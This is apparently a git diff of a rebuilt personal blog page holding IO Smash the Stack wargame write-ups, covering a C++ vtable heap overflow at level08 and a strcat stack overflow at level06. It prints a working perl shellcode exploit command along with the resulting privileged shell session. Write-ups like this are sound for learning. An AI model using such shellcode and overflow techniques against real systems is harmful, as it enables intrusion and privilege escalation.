@@ -11,7 +11,7 @@
 
   <title>
     
-      Álvaro Felipe Melchor &middot; Stuff about everything
+      Álvaro &middot; 
     
     Álvaro Felipe Melchor
   </title>
@@ -43,10 +43,10 @@
     <div class="sidebar-about">
       <h1>
         <a href="/">
-          Álvaro Felipe Melchor
+          Álvaro
         </a>
       </h1>
-      <p class="lead">Stuff about everything</p>
+      <p class="lead">Still learning</p>
     </div>
 
     <nav class="sidebar-nav">
@@ -119,135 +119,148 @@
 
     <span class="post-date">09 Feb 2015</span>
 
-    <p>Finally I got some time to write. I am going to try to summarize the process which I have had to pass to resolve the smash&#39;s level08.</p>
+    <p>Finally I got some time to write. I am going to try to summarize the process which I have had to pass to resolve the smash’s level08.</p>
 
 <p>The code for this exercise is the following.</p>
-<div class="highlight"><pre><code class="language-C++" data-lang="C++"> <span class="c1">// writen by bla for io.smashthestack.org</span>
-<span class="cp">#include &lt;iostream&gt;</span>
-<span class="cp">#include &lt;cstring&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
 
-<span class="k">class</span> <span class="nc">Number</span>
-<span class="p">{</span>
-        <span class="k">public</span><span class="o">:</span>
-                <span class="n">Number</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="o">:</span> <span class="n">number</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{}</span>
-                <span class="kt">void</span> <span class="n">setAnnotation</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span><span class="n">memcpy</span><span class="p">(</span><span class="n">annotation</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">a</span><span class="p">));}</span>
-                <span class="k">virtual</span> <span class="kt">int</span> <span class="k">operator</span><span class="o">+</span><span class="p">(</span><span class="n">Number</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="n">number</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">number</span><span class="p">;}</span>
-        <span class="k">private</span><span class="o">:</span>
-                <span class="kt">char</span> <span class="n">annotation</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
-                <span class="kt">int</span> <span class="n">number</span><span class="p">;</span>
-<span class="p">};</span>
+<pre><code class="language-C++"> // writen by bla for io.smashthestack.org
+#include &lt;iostream&gt;
+#include &lt;cstring&gt;
+#include &lt;unistd.h&gt;
+
+class Number
+{
+        public:
+                Number(int x) : number(x) {}
+                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+                virtual int operator+(Number &amp;r) {return number + r.number;}
+        private:
+                char annotation[100];
+                int number;
+};
 
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+int main(int argc, char **argv)
+{
+        if(argc &lt; 2) _exit(1);
 
-        <span class="n">Number</span> <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
-        <span class="n">Number</span> <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
-        <span class="n">Number</span> <span class="o">&amp;</span><span class="n">five</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">six</span> <span class="o">=</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
+        Number *x = new Number(5);
+        Number *y = new Number(6);
+        Number &amp;five = *x, &amp;six = *y;
 
-        <span class="n">five</span><span class="p">.</span><span class="n">setAnnotation</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        five.setAnnotation(argv[1]);
 
-        <span class="k">return</span> <span class="n">six</span> <span class="o">+</span> <span class="n">five</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>It is clear how the use of <code>memcpy</code> is insecure due to there is not sanitation on the argv[1] so we can write beyond the capacity of the member variable <code>annotation</code>.</p>
+        return six + five;
+}
+ 
+</code></pre>
+
+<p>It is clear how the use of <code class="highlighter-rouge">memcpy</code> is insecure due to there is not sanitation on the argv[1] so we can write beyond the capacity of the member variable <code class="highlighter-rouge">annotation</code>.</p>
 
 <p>To see if this fact is exploitable we need to figure out how is the layout of the class on memory. C++ classes are very similar with C’s structs. That means that the layout would be.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">AAAAAAAAAAAAAAAAAAAANNNN
+
+<div class="highlighter-rouge"><pre class="highlight"><code>AAAAAAAAAAAAAAAAAAAANNNN
 
 where:
 A -&gt; bytes of annotation
 N -&gt; bytes of number
-</code></pre></div>
-<p>But in this case we have an extra pointer which is normally known as <code>vtable</code>. So the layout would be as follows.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">PPPPAAAAAAAAAAAANNNN
+
+</code></pre>
+</div>
+
+<p>But in this case we have an extra pointer which is normally known as <code class="highlighter-rouge">vtable</code>. So the layout would be as follows.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>PPPPAAAAAAAAAAAANNNN
 where:
 P-&gt; pointer of vtable
 A-&gt; bytes of annotation
 N-&gt; bytes of number
-</code></pre></div>
+</code></pre>
+</div>
+
 <p>What is the goal of vtable in C++? This can be viewed as dynamic binding since is the way C++ resolve calls when the inheritances come out. The following <a href="http://phrack.org/issues/56/8.html">example</a>  try to explain the concept.</p>
-<div class="highlight"><pre><code class="language-C++" data-lang="C++"><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
 
-<span class="k">class</span> <span class="nc">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">private</span><span class="o">:</span>
-        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">SetBuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">String</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span><span class="n">String</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">,</span><span class="n">Buffer</span><span class="p">);</span>
-        <span class="p">}</span>
-<span class="p">};</span>
+<pre><code class="language-C++">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
 
-<span class="k">class</span> <span class="nc">MyClass1</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass1</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
-            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
-        <span class="p">}</span>
-<span class="p">};</span>
+class BaseClass
+{
+    private:
+        char buffer[32];
+    public:
+        void SetBuffer(char *String)
+        {
+            strcpy(Buffer,String);
+        }
+        virtual void PrintBuffer()
+        {
+            printf(“%s\n”,Buffer);
+        }
+};
 
-<span class="k">class</span> <span class="nc">MyClass2</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass2</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
-            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
-        <span class="p">}</span>
-<span class="p">};</span>
+class MyClass1:public BaseClass
+{
+    public:
+        void PrintBuffer()
+        {
+            printf(“MyClass1: “);
+            BaseClass::PrintBuffer();
+        }
+};
 
-<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="n">BaseClass</span> <span class="o">*</span><span class="n">Object</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+class MyClass2:public BaseClass
+{
+    public:
+        void PrintBuffer()
+        {
+            printf(“MyClass2: “);
+            BaseClass::PrintBuffer();
+        }
+};
 
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass1</span><span class="p">;</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass2</span><span class="p">;</span> 
+void main()
+{
+    BaseClass *Object[2];
 
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string1</span><span class="err">”</span><span class="p">);</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string2</span><span class="err">”</span><span class="p">);</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
-<span class="p">}</span>
+    Object[0] = new MyClass1;
+    Object[1] = new MyClass2; 
 
-<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">example</span>
-<span class="nl">MyClass1</span><span class="p">:</span> <span class="n">string1</span>
-<span class="nl">MyClass2</span><span class="p">:</span> <span class="n">string2</span>
-</code></pre></div>
-<p>What’s going on here? Thanks to vtable the runtime can resolve which method should call. Vtable how we have said before has been created to support dynamic binding or dynamic dispatch. It is an array of functions. This functions will be set at runtime to point to the correct function to be called. That is why the Object[0] knows that when it needs to call the member function <code>PrintBuffer</code>, it must call the MyClass1’s function instead of BaseClass’s. The same happens with Object[1].</p>
+    Object[0]-&gt;SetBuffer(“string1”);
+    Object[1]-&gt;SetBuffer(“string2”);
+    Object[0]-&gt;PrintBuffer();
+    Object[1]-&gt;PrintBuffer();
+}
 
-<p>If in somehow we can overwrite the vtable we can hijack the flow of our program to execute arbitrary code. That is the problem of the code that we showed at the beginning. </p>
+$ ./example
+MyClass1: string1
+MyClass2: string2
+</code></pre>
 
-<p>When we call <code>setAnnotation</code> on <code>five</code>, which is a reference to <code>x</code>, we are able to write beyond its space since we are using memcpy without sanitation. We overwrite <code>six</code> memory space, since it is after the five’s memory; with the consequence to overwrite vtable. After that, when the statement <code>return six + five</code> is called, that in reality is called <code>return six.operator+(five)</code>, the runtime look through the <code>vtable</code> to know the correct function to call. This is when the buffer overflow; that happens on the heap since the classes are created using <code>new</code>, can be exploited.</p>
+<p>What’s going on here? Thanks to vtable the runtime can resolve which method should call. Vtable how we have said before has been created to support dynamic binding or dynamic dispatch. It is an array of functions. This functions will be set at runtime to point to the correct function to be called. That is why the Object[0] knows that when it needs to call the member function <code class="highlighter-rouge">PrintBuffer</code>, it must call the MyClass1’s function instead of BaseClass’s. The same happens with Object[1].</p>
+
+<p>If in somehow we can overwrite the vtable we can hijack the flow of our program to execute arbitrary code. That is the problem of the code that we showed at the beginning.</p>
+
+<p>When we call <code class="highlighter-rouge">setAnnotation</code> on <code class="highlighter-rouge">five</code>, which is a reference to <code class="highlighter-rouge">x</code>, we are able to write beyond its space since we are using memcpy without sanitation. We overwrite <code class="highlighter-rouge">six</code> memory space, since it is after the five’s memory; with the consequence to overwrite vtable. After that, when the statement <code class="highlighter-rouge">return six + five</code> is called, that in reality is called <code class="highlighter-rouge">return six.operator+(five)</code>, the runtime look through the <code class="highlighter-rouge">vtable</code> to know the correct function to call. This is when the buffer overflow; that happens on the heap since the classes are created using <code class="highlighter-rouge">new</code>, can be exploited.</p>
 
 <p>If we use gdb we can see the layout of the memory.</p>
 
-<p><img src="/public/images/level8-1.png" alt="level8-1"></p>
+<p><img src="/public/images/level8-1.png" alt="level8-1" /></p>
 
-<p>We have to write our shellcode in <code>annotation</code> and then rewrite the six’s vtable to redirect it to our shellcode. Finally to exploit this we need to execute the following.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">/levels/level08 <span class="sb">`</span>perl -e ‘print “<span class="se">\x</span>10<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>17<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>2e<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>cd<span class="se">\x</span>80”,”A”x56,”<span class="se">\x</span>0c<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="sb">`</span>
+<p>We have to write our shellcode in <code class="highlighter-rouge">annotation</code> and then rewrite the six’s vtable to redirect it to our shellcode. Finally to exploit this we need to execute the following.</p>
 
-sh-4.2<span class="nv">$ </span>id
+<div class="highlighter-rouge"><pre class="highlight"><code>/levels/level08 <span class="sb">`</span>perl -e ‘print “<span class="se">\x</span>10<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>17<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>2e<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80”,”A”x56,”<span class="se">\x</span>0c<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="sb">`</span>
+
+<span class="gp">sh-4.2$ </span>id
 <span class="nv">uid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span>,1008<span class="o">(</span>level8<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
-sh-4.2<span class="nv">$ </span>cat /home/level9/.pass
+<span class="gp">sh-4.2$ </span>cat /home/level9/.pass
 XXXXXXXXXXX
-</code></pre></div>
+</code></pre>
+</div>
+
 <p>Write a shellcode is a difficult task in which I have to go deeper. This exercise has been very helpful to understand the danger of vtable on C++ and how the classes are represented in memory. We must be careful when we develop software since you never know where the danger resides.</p>
 
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level08smash&text=Level 08 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+<p>If you liked this post, you can <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level08smash&amp;text=Level 08 I/O Smash the Stack&amp;via=alvaro_fe">share it with your followers</a> or <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
 
   </div>
   
@@ -263,146 +276,161 @@ or
     <p>Those days I have been playing a little bit with <a href="http://io.smashthestack.org/">IO Smash the Stack</a>. By now I am in the level 8.</p>
 
 <p>Today I will explain how I resolved the level06 and the process that I followed. In this level we have the code and it is more large than the previous.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="c1">//written by bla</span>
-<span class="c1">//inspired by nnp</span>
-<span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
 
-<span class="k">enum</span><span class="p">{</span>
-<span class="n">LANG_ENGLISH</span><span class="p">,</span>
-<span class="n">LANG_FRANCAIS</span><span class="p">,</span>
-<span class="n">LANG_DEUTSCH</span><span class="p">,</span>
-<span class="p">};</span>
+<pre><code class="language-C">//written by bla
+//inspired by nnp
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
 
-<span class="kt">int</span> <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_ENGLISH</span><span class="p">;</span>
+enum{
+LANG_ENGLISH,
+LANG_FRANCAIS,
+LANG_DEUTSCH,
+};
 
-<span class="k">struct</span> <span class="n">UserRecord</span><span class="p">{</span>
-    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
-    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
-<span class="p">};</span>
+int language = LANG_ENGLISH;
 
-<span class="kt">void</span> <span class="nf">greetuser</span><span class="p">(</span><span class="k">struct</span> <span class="n">UserRecord</span> <span class="n">user</span><span class="p">){</span>
-    <span class="kt">char</span> <span class="n">greeting</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-    <span class="k">switch</span><span class="p">(</span><span class="n">language</span><span class="p">){</span>
-        <span class="k">case</span> <span class="nl">LANG_ENGLISH</span><span class="p">:</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Hi &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
-        <span class="k">case</span> <span class="nl">LANG_FRANCAIS</span><span class="p">:</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Bienvenue &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
-        <span class="k">case</span> <span class="nl">LANG_DEUTSCH</span><span class="p">:</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Willkommen &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="n">strcat</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">greeting</span><span class="p">);</span>
-<span class="p">}</span>
+struct UserRecord{
+	char name[40];
+	char password[32];
+	int id;
+};
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">env</span><span class="p">){</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;USAGE: %s [name] [password]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
+void greetuser(struct UserRecord user){
+	char greeting[64];
+	switch(language){
+		case LANG_ENGLISH:
+			strcpy(greeting, "Hi "); break;
+		case LANG_FRANCAIS:
+			strcpy(greeting, "Bienvenue "); break;
+		case LANG_DEUTSCH:
+			strcpy(greeting, "Willkommen "); break;
+	}
+	strcat(greeting, user.name);
+	printf("%s\n", greeting);
+}
 
-    <span class="k">struct</span> <span class="n">UserRecord</span> <span class="n">user</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-    <span class="n">strncpy</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">));</span>
-    <span class="n">strncpy</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">password</span><span class="p">));</span>
+int main(int argc, char **argv, char **env){
+	if(argc != 3) {
+		printf("USAGE: %s [name] [password]\n", argv[0]);
+		return 1;
+	}
 
-    <span class="kt">char</span> <span class="o">*</span><span class="n">envlang</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;LANG&quot;</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">envlang</span><span class="p">)</span>
-        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">envlang</span><span class="p">,</span> <span class="s">&quot;fr&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
-            <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_FRANCAIS</span><span class="p">;</span>
-        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">envlang</span><span class="p">,</span> <span class="s">&quot;de&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
-            <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_DEUTSCH</span><span class="p">;</span>
+	struct UserRecord user = {0};
+	strncpy(user.name, argv[1], sizeof(user.name));
+	strncpy(user.password, argv[2], sizeof(user.password));
 
-    <span class="n">greetuser</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>What this code does is easy to understand and also it is easy to spot where the vulnerability resides. Is in the function <code>strcat</code>. If we go to the <code>man page</code>.</p>
+	char *envlang = getenv("LANG");
+	if(envlang)
+		if(!memcmp(envlang, "fr", 2))
+			language = LANG_FRANCAIS;
+		else if(!memcmp(envlang, "de", 2))
+			language = LANG_DEUTSCH;
+
+	greetuser(user);
+}
+</code></pre>
+
+<p>What this code does is easy to understand and also it is easy to spot where the vulnerability resides. Is in the function <code class="highlighter-rouge">strcat</code>. If we go to the <code class="highlighter-rouge">man page</code>.</p>
 
 <blockquote>
-<p>The  strcat() function appends the src string to the dest string, overwriting the terminating null byte (&#39;\0&#39;) at the end of dest, and then adds a terminating null byte.  The strings may not overlap, and the dest string must have enough space for the result.  If dest is not large enough, program behavior is unpredictable; buffer overruns  are  a  favorite  avenue  for  attacking secure programs.</p>
-
-<p>The strncat() function is similar, except that</p>
-
-<ul>
-<li> it will use at most n bytes from src; and</li>
-<li> src does not need to be null-terminated if it contains n or more bytes.</li>
-</ul>
+  <p>The  strcat() function appends the src string to the dest string, overwriting the terminating null byte (‘\0’) at the end of dest, and then adds a terminating null byte.  The strings may not overlap, and the dest string must have enough space for the result.  If dest is not large enough, program behavior is unpredictable; buffer overruns  are  a  favorite  avenue  for  attacking secure programs.</p>
 </blockquote>
 
-<p>Basically strcat will append the src string until we get the <code>\0</code>. How we want to overflow the stack of greeting in the function <code>greetuser</code> we should look how the stack looks like when this function is called. To find out we will use <code>gdb</code>.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>disas greetuser
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> greetuser:
-   0x0804851c &lt;+0&gt;: push   ebp
-   0x0804851d &lt;+1&gt;: mov    ebp,esp
-   0x0804851f &lt;+3&gt;: sub    esp,0x58
-   0x08048522 &lt;+6&gt;: mov    eax,ds:0x8049964
-   0x08048527 &lt;+11&gt;:    cmp    eax,0x1
-   0x0804852a &lt;+14&gt;:    je     0x8048540 &lt;greetuser+36&gt;
-   0x0804852c &lt;+16&gt;:    cmp    eax,0x2
-   0x0804852f &lt;+19&gt;:    je     0x804855c &lt;greetuser+64&gt;
-   0x08048531 &lt;+21&gt;:    <span class="nb">test   </span>eax,eax
-   0x08048533 &lt;+23&gt;:    jne    0x8048574 &lt;greetuser+88&gt;
-   0x08048535 &lt;+25&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x08048538 &lt;+28&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x206948
-   0x0804853e &lt;+34&gt;:    jmp    0x8048574 &lt;greetuser+88&gt;
-   0x08048540 &lt;+36&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x08048543 &lt;+39&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x6e656942
-   0x08048549 &lt;+45&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,0x756e6576
-   0x08048550 &lt;+52&gt;:    mov    WORD PTR <span class="o">[</span>eax+0x8<span class="o">]</span>,0x2065
-   0x08048556 &lt;+58&gt;:    mov    BYTE PTR <span class="o">[</span>eax+0xa<span class="o">]</span>,0x0
-   0x0804855a &lt;+62&gt;:    jmp    0x8048574 &lt;greetuser+88&gt;
-   0x0804855c &lt;+64&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x0804855f &lt;+67&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x6c6c6957
-   0x08048565 &lt;+73&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,0x6d6d6f6b
-   0x0804856c &lt;+80&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x8<span class="o">]</span>,0x206e65
-   0x08048573 &lt;+87&gt;:    nop
-   0x08048574 &lt;+88&gt;:    lea    eax,<span class="o">[</span>ebp+0x8<span class="o">]</span>
-   0x08048577 &lt;+91&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
-   0x0804857b &lt;+95&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x0804857e &lt;+98&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x08048581 &lt;+101&gt;:   call   0x80483d0 &lt;strcat@plt&gt;
-   0x08048586 &lt;+106&gt;:   lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x08048589 &lt;+109&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x0804858c &lt;+112&gt;:   call   0x80483f0 &lt;puts@plt&gt;
-   0x08048591 &lt;+117&gt;:   leave
-   0x08048592 &lt;+118&gt;:   ret
-End of assembler dump.
-gdb-peda<span class="nv">$ </span>b * 0x0804857e  <span class="p">;</span> Breakpoint before to call strcat
-gdb-peda<span class="nv">$ </span>r AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBB
-gdb-peda<span class="nv">$ </span>x/64xw <span class="nv">$esp</span>
-</code></pre></div>
-<p><img src="/public/images/stackio6.png" alt="stackio6"></p>
+<blockquote>
+  <p>The strncat() function is similar, except that</p>
+</blockquote>
 
